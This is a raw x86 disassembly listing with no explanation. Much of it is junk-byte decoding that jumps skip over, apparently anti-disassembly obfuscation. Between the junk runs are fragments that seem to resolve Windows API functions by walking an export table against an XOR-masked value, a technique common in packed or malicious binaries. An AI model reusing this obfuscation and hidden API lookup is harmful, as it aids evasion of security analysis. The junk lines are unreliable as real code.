  40b8e0:	rol    DWORD PTR [edi],0x8a
  40b8e3:	inc    ebp
  40b8e4:	cmp    al,0x72
  40b8e6:	cs pop edi
  40b8e8:	jno    0x40b8df
  40b8ea:	ds loope 0x40b91a
  40b8ed:	mov    ch,0x8b
  40b8ef:	xlat   BYTE PTR ds:[ebx]
  40b8f0:	mov    ds,WORD PTR [edx]
  40b8f2:	call   0x73bd710b
  40b8f7:	mov    bh,0xe2
  40b8f9:	out    dx,al
  40b8fa:	push   ds
  40b8fb:	std    
  40b8fc:	jle    0x40b978
  40b8fe:	scas   eax,DWORD PTR es:[edi]
  40b8ff:	or     ebp,DWORD PTR [ecx+0x3f668d98]
  40b905:	and    eax,0xbb601bb6
  40b90a:	push   esp
  40b90b:	mov    WORD PTR [ecx+0x7],es
  40b90e:	push   ss
  40b90f:	pop    ds
  40b910:	int    0x93
  40b912:	int3   
  40b913:	dec    edi
  40b914:	mov    ebx,0x5c300bb6
  40b919:	ss dec ecx
  40b91b:	(bad)  
  40b91c:	sti    
  40b91d:	inc    esi
  40b91e:	rol    BYTE PTR [edi+0x7f],cl
  40b921:	aaa    
  40b922:	(bad)  [edx+0x35429bfc]
  40b928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b929:	mov    dl,0x92
  40b92b:	(bad)  
  40b92c:	fist   WORD PTR [eax-0x274e5c19]
  40b932:	sbb    BYTE PTR [edx+0x7b],ah
  40b935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b936:	popf   
  40b937:	jmp    0x458b:0xd44d8965
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	dec    esp
  40b965:	outs   dx,DWORD PTR ds:[esi]
  40b966:	std    
  40b967:	cld    
  40b968:	jns    0x40b99d
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	or     BYTE PTR [ecx-0x94b307a],bh
  40b976:	(bad)  
  40b977:	mov    bh,0x4f
  40b979:	lds    ebx,FWORD PTR [ebx+esi*2-0x1a8df818]
  40b980:	sub    eax,0x8cbc2154
  40b985:	xchg   BYTE PTR [ebp+0x185bc7b0],dh
  40b98b:	sti    
  40b98c:	jae    0x40ba00
  40b98e:	pop    DWORD PTR [eax]
  40b990:	arpl   WORD PTR [ecx],si
  40b992:	dec    edi
  40b993:	sub    BYTE PTR [bp+di-0x20],al
  40b997:	jae    0x40b93c
  40b999:	(bad)  
  40b99a:	cmp    DWORD PTR [edx-0x737ec03c],edi
  40b9a0:	jp     0x40b946
  40b9a2:	push   eax
  40b9a3:	imul   ebx,DWORD PTR [esi+0x3054e5fb],0x2bdb9c3e
  40b9ad:	mov    ah,0x59
  40b9af:	pushf  
  40b9b0:	jecxz  0x40b944
  40b9b2:	sbb    eax,0xace6e251
  40b9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b8:	test   BYTE PTR [edi+eax*4-0x6fb61ed0],cl
  40b9bf:	xchg   dl,dl
  40b9c1:	repz call 0x57710d3b
  40b9c7:	pop    ds
  40b9c8:	fucom  st(0)
  40b9ca:	ret    0x60b8
  40b9cd:	aaa    
  40b9ce:	pop    ebx
  40b9cf:	out    dx,eax
  40b9d0:	sub    edi,ebx
  40b9d2:	rol    BYTE PTR [eax],1
  40b9d4:	dec    ebx
  40b9d5:	repnz lods eax,DWORD PTR ds:[esi]
  40b9d7:	sbb    cl,BYTE PTR [edx+0x3ac7c5b0]
  40b9dd:	aad    0xee
  40b9df:	jge    0x40b9ff
  40b9e1:	mov    WORD PTR [eax+ebp*8+0xf7d12db],?
  40b9e8:	adc    al,0x85
  40b9ea:	fst    QWORD PTR [esi]
  40b9ec:	sbb    DWORD PTR [ebx-0x34],edi
  40b9ef:	inc    ebp
  40b9f0:	jnp    0x40ba12
  40b9f2:	mov    ds:0xe20a787b,eax
  40b9f7:	add    ebx,0x36
  40b9fa:	(bad)  
  40b9fb:	mov    ds:0xbe44c6f1,eax
  40ba00:	pop    esi
  40ba01:	gs dec ebp
  40ba03:	inc    edi
  40ba04:	sub    DWORD PTR [esi],ebx
  40ba06:	mov    ebp,0xc75f1c4e
  40ba0b:	int3   
  40ba0c:	mov    al,ds:0xcde152ce
  40ba11:	dec    ebx
  40ba12:	xchg   ebp,eax
  40ba13:	in     al,0xa
  40ba15:	mov    bh,dl
  40ba17:	adc    ebx,DWORD PTR ds:0x6dfbbafb
  40ba1d:	inc    esp
  40ba1e:	mov    al,0xbe
  40ba20:	mov    edx,DWORD PTR [edi+0x7fde78e7]
  40ba26:	out    dx,eax
  40ba27:	mov    bh,0xc2
  40ba29:	mov    eax,0x10cdc6b0
  40ba2e:	mov    ecx,0x8b9452b8
  40ba33:	out    0x51,eax
  40ba35:	sbb    al,0x14
  40ba37:	aaa    
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock es mov dl,0x53
  40ba76:	jl     0x40ba29
  40ba78:	xor    BYTE PTR [esi+0x7e],bh
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	pop    eax
  40ba80:	lods   eax,DWORD PTR ds:[esi]
  40ba81:	and    al,BYTE PTR [esi+0x6f]
  40ba84:	outs   dx,BYTE PTR ds:[esi]
  40ba85:	call   0xaf637bd1
  40ba8a:	mov    ecx,edx
  40ba8c:	push   edi
  40ba8d:	adc    al,0xc0
  40ba8f:	jge    0x40ba2f
  40ba91:	outs   dx,DWORD PTR ds:[esi]
  40ba92:	cmp    DWORD PTR [ebp+eiz*1+0x8],edi
  40ba96:	inc    ebp
  40ba97:	add    ebx,ebx
  40ba99:	aad    0x15
  40ba9b:	pop    eax
  40ba9c:	push   ebx
  40ba9d:	pop    esp
  40ba9e:	mov    edi,0x91b647bc
  40baa3:	in     eax,0x8c
  40baa5:	(bad)  
  40baa6:	push   cs
  40baa7:	jecxz  0x40ba4b
  40baa9:	xchg   ecx,esp
  40baab:	dec    ebx
  40baac:	mov    DWORD PTR [ebx],ecx
  40baae:	mov    dl,0xa0
  40bab0:	add    dl,BYTE PTR [ebx+0x72]
  40bab3:	or     al,0x9b
  40bab5:	adc    eax,0x3eb3c37a
  40baba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40babb:	out    dx,eax
  40babc:	jg     0x40ba91
  40babe:	scas   eax,DWORD PTR es:[edi]
  40babf:	stos   DWORD PTR es:[edi],eax
  40bac0:	mov    ebx,0xf7e40a17
  40bac5:	stc    
  40bac6:	dec    BYTE PTR [eax-0x47]
  40bac9:	sub    bh,BYTE PTR [esi-0x54]
  40bacc:	shr    BYTE PTR [eax+0x58],cl
  40bacf:	cmp    ebx,DWORD PTR ss:[eax+0x6a]
  40bad3:	and    bl,BYTE PTR [esi]
  40bad5:	(bad)  
  40bad6:	push   ebx
  40bad7:	aas    
  40bad8:	and    edi,DWORD PTR [esi]
  40bada:	fs stos DWORD PTR es:[edi],eax
  40badc:	mov    al,0xee
  40bade:	je     0x40bb30
  40bae0:	xchg   esp,eax
  40bae1:	mov    WORD PTR [edx],cs
  40bae3:	enter  0xadc5,0x5d
  40bae7:	mov    DWORD PTR [esp+eiz*2+0x75],esp
  40baeb:	aas    
  40baec:	sahf   
  40baed:	dec    ebx
  40baee:	inc    ecx
  40baef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf0:	fistp  WORD PTR [ebx]
  40baf2:	xlat   BYTE PTR ds:[ebx]
  40baf3:	pop    edx
  40baf4:	push   cs
  40baf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf6:	shl    BYTE PTR [ebp+esi*2-0x198ac0a0],1
  40bafd:	aaa    
  40bafe:	mov    ch,0xa
  40bb00:	icebp  
  40bb01:	adc    eax,0xe94cf9c5
  40bb06:	mov    BYTE PTR [esi+ecx*8+0x41fa4fb1],cl
  40bb0d:	push   ebp
  40bb0e:	(bad)  
  40bb0f:	or     BYTE PTR [ebp-0x25048e9f],al
  40bb15:	and    eax,0xc8401bc0
  40bb1a:	rcl    ebx,cl
  40bb1c:	inc    ebp
  40bb1d:	rol    BYTE PTR [ebp-0x14],0xd9
  40bb21:	jl     0x40bb11
  40bb23:	pop    ds
  40bb24:	mov    ecx,0x64e6ff0e
  40bb29:	inc    DWORD PTR [ecx]
  40bb2b:	add    ebx,0x27
  40bb2e:	sbb    bl,ch
  40bb30:	mov    dh,0xb2
  40bb32:	jg     0x40bafb
  40bb34:	into   
  40bb35:	jmp    0x40bb47
  40bb37:	shl    DWORD PTR [ecx+0x5176ee28],1
  40bb3d:	fist   DWORD PTR [ebx+0x21d565f9]
  40bb43:	mov    WORD PTR [eax],fs
  40bb45:	jno    0x40bb2f
  40bb47:	inc    edi
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	add    bl,BYTE PTR [eax+0x16]
  40bbc4:	pusha  
  40bbc5:	mov    DWORD PTR [ecx],esi
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	sbb    BYTE PTR [ecx-0x6a],ch
  40bbd0:	adc    al,0x79
  40bbd2:	ins    BYTE PTR es:[edi],dx
  40bbd3:	mov    WORD PTR [edi-0x193b5f39],?
  40bbd9:	lods   al,BYTE PTR ds:[esi]
  40bbda:	push   edx
  40bbdb:	jne    0x40bc2d
  40bbdd:	xor    al,0x22
  40bbdf:	call   0x187facc8
  40bbe4:	inc    esi
  40bbe5:	push   cs
  40bbe6:	or     BYTE PTR [esi],ah
  40bbe8:	in     al,dx
  40bbe9:	mul    BYTE PTR [edi-0x573cd383]
  40bbef:	ror    BYTE PTR [eax],0x92
  40bbf2:	ja     0x40bbca
  40bbf4:	pop    esp
  40bbf5:	(bad)  
  40bbf6:	out    0xaa,al
  40bbf8:	stc    
  40bbf9:	sbb    esp,DWORD PTR ss:[edi+esi*1+0x5]
  40bbfe:	pop    ds
  40bbff:	dec    esi
  40bc00:	xchg   esi,eax
  40bc01:	mov    fs,WORD PTR [esi+ebp*4]
  40bc04:	mov    eax,ds:0xd398a7c4
  40bc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc0a:	mov    eax,0xb380b6b7
  40bc0f:	xor    al,0x31
  40bc11:	rol    BYTE PTR [edx-0x55],1
  40bc14:	pop    ds
  40bc15:	pop    edx
  40bc16:	push   edx
  40bc17:	pop    eax
  40bc18:	rcr    DWORD PTR [ecx-0x5b5fe7db],0x68
  40bc1f:	mov    WORD PTR [ecx+eiz*2+0x3d],cs
  40bc23:	sahf   
  40bc24:	xchg   esi,eax
  40bc25:	adc    dh,BYTE PTR [edi-0x51]
  40bc28:	lods   eax,DWORD PTR ds:[esi]
  40bc29:	cmp    DWORD PTR [edi+eiz*4],edi
  40bc2c:	xor    BYTE PTR [si-0x56],al
  40bc30:	lods   al,BYTE PTR ds:[esi]
  40bc31:	mov    ecx,0x95910c82
  40bc36:	jb     0x40bcb7
  40bc38:	mov    ds:0x4a0d4b2e,al
  40bc3d:	repz test DWORD PTR [eax-0x7d],esi
  40bc41:	sbb    BYTE PTR [edx-0x2922a951],ch
  40bc47:	inc    edx
  40bc48:	xchg   DWORD PTR [edi+0x57],ecx
  40bc4b:	lods   eax,DWORD PTR ds:[esi]
  40bc4c:	sbb    al,0xc8
  40bc4e:	xchg   BYTE PTR ds:0x52808f6d,ch
  40bc54:	mov    eax,es
  40bc56:	rol    edi,cl
  40bc58:	jl     0x40bc54
  40bc5a:	push   ds
  40bc5b:	adc    edi,DWORD PTR [edx]
  40bc5d:	jl     0x40bc3d
  40bc5f:	push   eax
  40bc60:	push   ebp
  40bc61:	sbb    eax,0x53550511
  40bc66:	nop
  40bc67:	pop    esi
  40bc68:	xchg   edx,ebp
  40bc6a:	pop    es
  40bc6b:	and    ebx,esp
  40bc6d:	xchg   ecx,eax
  40bc6e:	icebp  
  40bc6f:	(bad)  
  40bc71:	mov    ebx,DWORD PTR [ecx*8+0x103258bd]
  40bc78:	fist   DWORD PTR [edx]
  40bc7a:	inc    ebp
  40bc7b:	neg    ebp
  40bc7d:	sbb    BYTE PTR ds:0x1e85687e,bh
  40bc83:	in     al,dx
  40bc84:	enter  0x2722,0x6e
  40bc88:	mov    ah,0xf0
  40bc8a:	(bad)  
  40bc8b:	inc    edi
  40bc8c:	out    0xed,eax
  40bc8e:	xchg   ebx,eax
  40bc8f:	mov    edi,eax
  40bc91:	fisubr DWORD PTR [eax-0x78a4ece6]
  40bc97:	retf   
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	jg     0x40bc76
  40bcc3:	(bad)  
  40bcc4:	out    0xc1,eax
  40bcc6:	ss jle 0x40bd47
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	push   esi
  40bcce:	xchg   edi,eax
  40bccf:	out    dx,eax
  40bcd0:	push   0x47
  40bcd2:	sbb    ah,cl
  40bcd4:	or     ebp,DWORD PTR [esi-0x77]
  40bcd7:	scas   al,BYTE PTR es:[edi]
  40bcd8:	retf   0xc60e
  40bcdb:	xchg   edx,eax
  40bcdc:	bound  ecx,QWORD PTR [eax+eiz*2+0x7479b6ec]
  40bce3:	cmp    eax,0x9a556be
  40bce8:	aam    0x60
  40bcea:	popa   
  40bceb:	mov    esp,0xa7f9f99c
  40bcf0:	adc    al,0xa2
  40bcf2:	ds jne 0x40bce6
  40bcf5:	or     al,0xa9
  40bcf7:	(bad)  
  40bcf9:	in     eax,dx
  40bcfa:	in     eax,dx
  40bcfb:	jns    0x40bd3b
  40bcfd:	(bad)  
  40bcfe:	mov    edi,DWORD PTR [esi+0x120c4fa]
  40bd04:	mov    dh,0xfd
  40bd06:	and    al,0xf
  40bd08:	mov    bh,0x70
  40bd0a:	mov    al,ds:0x468562c1
  40bd0f:	xbegin 0x9031199
  40bd15:	pop    edi
  40bd16:	jle    0x40bcc2
  40bd18:	cld    
  40bd19:	xor    al,0xc0
  40bd1b:	aaa    
  40bd1c:	jbe    0x40bd09
  40bd1e:	cwde   
  40bd1f:	mov    cl,0xfe
  40bd21:	sbb    bl,al
  40bd23:	ret    
  40bd24:	jne    0x40bcd4
  40bd26:	cs ret 0x563b
  40bd2a:	in     al,dx
  40bd2b:	xchg   edx,eax
  40bd2c:	xchg   DWORD PTR [ebx+0x39614784],ebx
  40bd32:	popa   
  40bd33:	push   edi
  40bd34:	jbe    0x40bd44
  40bd36:	mov    bl,0x44
  40bd38:	(bad)  
  40bd39:	shr    DWORD PTR [ecx+ebx*1-0x6a],cl
  40bd3d:	aaa    
  40bd3e:	jb     0x40bcfd
  40bd40:	leave  
  40bd41:	push   0x6240bf0c
  40bd46:	or     ecx,ebx
  40bd48:	mov    edi,db3
  40bd4b:	les    edx,FWORD PTR [eax+edi*8-0x55]
  40bd4f:	push   ebx
  40bd50:	mov    edi,0x27ae6ef2
  40bd55:	jnp    0x40bdaa
  40bd57:	outs   dx,DWORD PTR ds:[esi]
  40bd58:	pop    eax
  40bd59:	pop    ecx
  40bd5a:	jnp    0x40bd06
  40bd5c:	inc    esp
  40bd5d:	jge    0x40bd1a
  40bd5f:	out    dx,eax
  40bd60:	into   
  40bd61:	and    al,0x22
  40bd63:	and    DWORD PTR [ebp+0x1bc36805],ebx
  40bd69:	push   ecx
  40bd6a:	or     BYTE PTR [ebx],ch
  40bd6c:	and    eax,0x24834cec
  40bd71:	adc    BYTE PTR [edx+eax*8+0x13],bl
  40bd75:	mov    WORD PTR [esi-0x14],ds
  40bd78:	mov    al,ds:0xcc15bf90
  40bd7d:	test   eax,0x95371e7c
  40bd82:	addr16 push ebx
  40bd84:	xchg   edi,eax
  40bd85:	repnz xchg esp,eax
  40bd87:	es retf 0x6e32
  40bd8b:	hlt    
  40bd8c:	fstp   TBYTE PTR gs:[edi-0x9890080]
  40bd93:	dec    esp
  40bd94:	je     0x40bdc9
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	push   ebp
  40bdbd:	inc    ebx
  40bdbe:	push   es
  40bdbf:	das    
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	dec    ebp
  40bdc9:	adc    ecx,ebp
  40bdcb:	aad    0x94
  40bdcd:	cmp    ebp,eax
  40bdcf:	xchg   BYTE PTR [eax],bh
  40bdd1:	xor    ecx,DWORD PTR [edi-0x4f]
  40bdd4:	push   ecx
  40bdd5:	(bad)  
  40bdd6:	das    
  40bdd7:	sub    esp,DWORD PTR ds:0xc664957e
  40bddd:	xchg   bh,ch
  40bddf:	jg     0x40bdee
  40bde1:	inc    ebx
  40bde2:	stos   DWORD PTR es:[edi],eax
  40bde3:	mov    fs,edi
  40bde5:	sbb    edx,DWORD PTR [ecx+0x3a]
  40bde8:	push   ss
  40bde9:	test   DWORD PTR [eax-0x70626ea6],ebx
  40bdef:	aad    0xd0
  40bdf1:	rol    bh,cl
  40bdf3:	test   eax,0xe9e8e6b6
  40bdf8:	(bad)  
  40bdf9:	xlat   BYTE PTR ds:[ebx]
  40bdfa:	popa   
  40bdfb:	sub    ch,BYTE PTR [edi+edi*8+0x26]
  40bdff:	or     BYTE PTR [ebx+0x43830df3],ch
  40be05:	jae    0x40be68
  40be07:	rcr    esp,0x2d
  40be0a:	fld    TBYTE PTR fs:[esi+edi*4]
  40be0e:	push   ecx
  40be0f:	sub    al,ah
  40be11:	dec    ecx
  40be12:	or     BYTE PTR ds:0x551ee67b,bh
  40be18:	ds and edi,ebp
  40be1b:	inc    ebx
  40be1c:	ja     0x40bdd3
  40be1e:	cmp    DWORD PTR [esi],edx
  40be20:	adc    eax,0xab51d283
  40be25:	(bad)  
  40be26:	mov    bl,0xd8
  40be28:	dec    ecx
  40be29:	add    eax,0x5750599a
  40be2e:	push   eax
  40be2f:	pop    ss
  40be30:	inc    ebp
  40be31:	loope  0x40be1a
  40be33:	push   ss
  40be34:	popa   
  40be35:	rcl    DWORD PTR [eax+0x24],1
  40be38:	mov    ecx,eax
  40be3a:	cmp    DWORD PTR [ebx],ecx
  40be3c:	jg     0x40be07
  40be3e:	xchg   edi,eax
  40be3f:	into   
  40be40:	and    BYTE PTR [ebx],cl
  40be42:	stos   DWORD PTR es:[edi],eax
  40be43:	and    al,0xa9
  40be45:	test   al,0x99
  40be47:	sub    edx,edi
  40be49:	add    BYTE PTR [edi+0x1b],bh
  40be4c:	hlt    
  40be4d:	mov    ch,0x1a
  40be4f:	jne    0x40be1d
  40be51:	into   
  40be52:	cmovle esp,DWORD PTR [eax]
  40be55:	out    dx,eax
  40be56:	xchg   edx,ebp
  40be58:	imul   DWORD PTR [edx+0x5217b537]
  40be5e:	adc    cl,dl
  40be60:	push   cs
  40be61:	inc    ebx
  40be62:	sbb    DWORD PTR [eax+0x6d2ebdc1],0x100dbc57
  40be6c:	push   edi
  40be6d:	lock mov bl,0x55
  40be70:	dec    BYTE PTR [edi]
  40be72:	ss jg  0x40be89
  40be75:	xor    al,0x11
  40be77:	(bad)  
  40be78:	stc    
  40be79:	int3   
  40be7a:	xchg   edi,eax
  40be7b:	sbb    ebp,edx
  40be7d:	pop    ebx
  40be7e:	jecxz  0x40be47
  40be80:	inc    BYTE PTR [esp+edx*4+0x3f]
  40be84:	shl    bl,cl
  40be86:	fwait
  40be87:	test   eax,0x7b55134e
  40be8c:	jb     0x40be10
  40be8e:	xor    esi,DWORD PTR [ecx-0x16fd50f1]
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xd5187640
  40bea6:	xor    DWORD PTR [ecx+edx*2-0x498181c9],edx
  40bead:	jle    0x40bf2d
  40beaf:	jle    0x40bf10
  40beb1:	stos   DWORD PTR es:[edi],eax
  40beb2:	(bad)  
  40beb3:	out    dx,al
  40beb4:	(bad)  
  40beb5:	and    bh,BYTE PTR [ecx+0x70ac2ca5]
  40bebb:	(bad)  
  40bebc:	je     0x40beb8
  40bebe:	repz sti 
  40bec0:	mov    edx,0xf372389a
  40bec5:	out    dx,al
  40bec6:	pushf  
  40bec7:	jae    0x40bea1
  40bec9:	push   edi
  40beca:	mov    ebp,0xd4b22afe
  40becf:	aaa    
  40bed0:	fnstenv [esi-0x67]
  40bed3:	sub    al,0xb9
  40bed5:	not    BYTE PTR [edx+0x6f]
  40bed8:	xchg   dh,bl
  40beda:	outs   dx,DWORD PTR ds:[si]
  40bedc:	mov    dl,0xc8
  40bede:	push   ss
  40bedf:	out    0x9e,eax
  40bee1:	xlat   BYTE PTR ds:[ebx]
  40bee2:	dec    edi
  40bee3:	add    eax,0xe433a1d5
  40bee8:	ror    BYTE PTR [ebx-0x57],cl
  40beeb:	ss mov eax,0x40367cf5
  40bef1:	push   esi
  40bef2:	xor    DWORD PTR [ecx],0x27
  40bef5:	loope  0x40bec7
  40bef7:	fdiv   DWORD PTR [ebp+0xd2787ac]
  40befd:	loopne 0x40bf3b
  40beff:	pop    eax
  40bf00:	dec    esp
  40bf01:	jl     0x40bf7c
  40bf03:	pop    es
  40bf04:	ins    BYTE PTR es:[edi],dx
  40bf05:	stos   BYTE PTR es:[edi],al
  40bf06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf07:	int    0x59
  40bf09:	(bad)  
  40bf0a:	lock sub bl,BYTE PTR [ebx]
  40bf0d:	add    eax,0x200826fa
  40bf12:	mov    esi,0x6470702a
  40bf17:	fwait
  40bf18:	inc    ecx
  40bf19:	mov    al,ds:0xc3a0f8a4
  40bf1e:	jne    0x40bf22
  40bf20:	out    0xd9,eax
  40bf22:	push   ebp
  40bf23:	dec    ebx
  40bf24:	mov    esi,0xa2e6c1c1
  40bf29:	aam    0x1c
  40bf2b:	inc    eax
  40bf2c:	add    BYTE PTR [eax-0x1ea00646],cl
  40bf32:	mov    WORD PTR [ebp+eax*2+0x4f764604],ds
  40bf39:	cmp    cl,BYTE PTR [esi+0x4c9c8632]
  40bf3f:	das    
  40bf40:	cmp    ch,BYTE PTR [eax+0x5c]
  40bf43:	pop    ds
  40bf44:	pop    eax
  40bf45:	or     esp,DWORD PTR [eax+0x41b59952]
  40bf4b:	lock lods al,BYTE PTR ds:[esi]
  40bf4d:	jbe    0x40bf0b
  40bf4f:	shr    DWORD PTR [eax-0x70833467],1
  40bf55:	out    0xb6,al
  40bf57:	das    
  40bf58:	sahf   
  40bf59:	sub    DWORD PTR [ecx-0x3e98dea1],esp
  40bf5f:	inc    ebp
  40bf60:	mov    ds:0x70e93699,eax
  40bf65:	jbe    0x40bef8
  40bf67:	and    eax,ebp
  40bf69:	mov    ah,0x58
  40bf6b:	cmp    al,BYTE PTR [ecx+eax*8]
  40bf6e:	std    
  40bf6f:	sub    ebx,esi
  40bf71:	xlat   BYTE PTR ds:[ebx]
  40bf72:	sbb    esi,DWORD PTR ds:0xaa6b9e9d
  40bf78:	mov    edx,DWORD PTR [ebp-0x4]
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfae:	mov    edx,0x34a97816
  40bfb3:	jle    0x40c033
  40bfb5:	mov    dh,0x7e
  40bfb7:	jle    0x40c037
  40bfb9:	sub    BYTE PTR [edx+0x689f7905],al
  40bfbf:	sub    bh,BYTE PTR [ecx]
  40bfc1:	pusha  
  40bfc2:	pushf  
  40bfc3:	mov    WORD PTR [ebp+0x74],fs
  40bfc6:	add    ah,BYTE PTR [eax+0x53a7cefe]
  40bfcc:	pop    edi
  40bfcd:	add    esp,DWORD PTR [ecx-0x38507e9]
  40bfd3:	inc    edx
  40bfd4:	xor    ecx,DWORD PTR [edi]
  40bfd6:	(bad)  
  40bfd7:	das    
  40bfd8:	call   0xcaa1:0x3c14f7be
  40bfdf:	test   dl,bh
  40bfe1:	mov    ebp,0x7dcd0e5c
  40bfe6:	les    eax,FWORD PTR [ecx+0x39]
  40bfe9:	xchg   edx,eax
  40bfea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfeb:	(bad)  
  40bfec:	mov    esp,0x6af8019
  40bff1:	mov    ds:0x86600798,al
  40bff6:	(bad)  
  40bff7:	in     al,0xf3
  40bff9:	inc    esi
  40bffa:	add    al,0x16
  40bffc:	add    eax,0x957ce670
  40c001:	push   esp
  40c002:	sbb    eax,0x8de1c88d
  40c007:	push   0x5ba2d364
  40c00c:	aas    
  40c00d:	mov    dh,0x20
  40c00f:	shl    BYTE PTR [ecx+0x2d006f60],1
  40c015:	imul   eax,DWORD PTR [ebp-0x75],0x17c28df2
  40c01c:	adc    BYTE PTR [ebx-0x15053f10],bl
  40c022:	pop    esp
